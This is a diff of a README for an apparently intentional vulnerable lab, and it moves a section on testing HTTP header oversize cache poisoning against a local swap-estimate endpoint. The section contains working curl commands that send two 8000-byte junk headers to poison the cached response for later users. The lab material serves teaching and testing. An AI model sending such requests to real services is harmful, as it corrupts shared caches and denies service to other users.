@@ -26,25 +26,6 @@ The swap estimation endpoint (`/api/swap-estimate`) is vulnerable to HTTP Header
    - Stores poisoned response
 3. Subsequent users receive malicious cached response
 
-## How to Test the HHO Attack
-
-1. Start the server with increased header limits:
-```bash
-node --max-http-header-size=17000 server.js
-```
-
-2. Send poisoning request:
-```bash
-curl "http://localhost:4000/api/swap-estimate?fromToken=ETH&toToken=USDC&amount=1" \
-  -H "X-Large-Header-1: $(head -c 8000 < /dev/zero | tr '\0' 'a')" \
-  -H "X-Large-Header-2: $(head -c 8000 < /dev/zero | tr '\0' 'b')"
-```
-
-3. Verify cached response persists through normal requests:
-```bash
-curl http://localhost:4000/api/swap-estimate?fromToken=ETH&toToken=USDC&amount=1
-```
-
 ## Lab Setup
 
 The lab consists of two components:
@@ -92,6 +73,27 @@ npm start
 ```
 
 The React app will run on http://localhost:3000.
+
+
+## How to Test the HHO Attack
+
+1. Start the server with increased header limits:
+```bash
+node --max-http-header-size=17000 server.js
+```
+
+2. Send poisoning request:
+```bash
+curl "http://localhost:4000/api/swap-estimate?fromToken=ETH&toToken=USDC&amount=1" \
+  -H "X-Large-Header-1: $(head -c 8000 < /dev/zero | tr '\0' 'a')" \
+  -H "X-Large-Header-2: $(head -c 8000 < /dev/zero | tr '\0' 'b')"
+```
+
+3. Verify cached response persists through normal requests:
+```bash
+curl http://localhost:4000/api/swap-estimate?fromToken=ETH&toToken=USDC&amount=1
+```
+
 
 
 ## Disclaimer
